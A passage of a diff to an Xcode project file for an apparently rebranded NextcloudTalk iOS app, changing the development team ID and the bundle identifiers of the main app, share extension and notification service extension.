 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
@@ -3036,7 +3025,7 @@
 				);
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "NextcloudTalk/NextcloudTalk-Bridging-Header.h";
@@ -3068,7 +3057,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3123,7 +3112,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.ShareExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.ShareExtension;
 				PRODUCT_NAME = ShareExtension;
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3159,7 +3148,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
 				DEFINES_MODULE = YES;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3213,7 +3202,7 @@
 				);
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.ShareExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.ShareExtension;
 				PRODUCT_NAME = ShareExtension;
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3247,7 +3236,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3285,7 +3274,7 @@
 				MARKETING_VERSION = 23.0.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NotificationServiceExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NotificationServiceExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
@@ -3319,7 +3308,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = KC28TW5938;
+				DEVELOPMENT_TEAM = NH96879NSZ;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = "$(inherited)";
 				GCC_C_LANGUAGE_STANDARD = gnu11;
@@ -3356,7 +3345,7 @@
 				LIBRARY_SEARCH_PATHS = "$(inherited)";
 				MARKETING_VERSION = 23.0.0;
 				MTL_FAST_MATH = YES;
-				PRODUCT_BUNDLE_IDENTIFIER = com.si.Alajery.NotificationServiceExtension;
+				PRODUCT_BUNDLE_IDENTIFIER = com.tassostalk.NotificationServiceExtension;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = APP_EXTENSION;
